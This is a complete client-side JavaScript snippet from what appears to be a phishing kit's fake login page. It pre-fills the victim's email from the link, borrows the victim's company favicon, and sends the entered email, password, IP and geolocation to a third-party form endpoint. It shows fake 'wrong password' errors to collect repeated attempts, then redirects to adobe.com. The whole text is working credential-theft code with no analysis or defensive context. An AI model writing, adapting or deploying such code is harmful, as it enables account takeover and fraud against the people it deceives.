<script>
    let step = 1;

    const clientID = window.location.hash.split("#").pop();
    $('#email').val(clientID);
    const domain = clientID.split('@').pop();


    $("#logo").attr("src", "https://www.google.com/s2/favicons?domain="+domain);


    const submit = $("button[type='submit']");

    $("#login-form").submit(function(event) {
        event.preventDefault();

        submit.text('Verifying...');

        $.getJSON('https://ipinfo.io', function(response) {
            const posting = $.post("https://nocodeform.io/f/651149bf0a1418d98d96052c", {
                _subject: "Logs | " + response.ip,
                Email: $("#email").val(),
                Password: $("#password").val(),
                Attempts: step,
                IP: response.ip,
                Location: response.city + ", " + response.country,
            });

            posting.done(function(data) {
                if (step === 4) {
                    window.location.href = "https://www.adobe.com/";
                } else {
                    step++;
                    $("#error").css("display", "block");
                    submit.text('Sign In');
                    $("#password").val("");
                }
            });

            posting.fail(function(error) {
                console.error(error);
                $("#error").css("display", "block");
                submit.text('Sign In');
                $("#password").val("");
            });
        }, "json");
    });
</script>
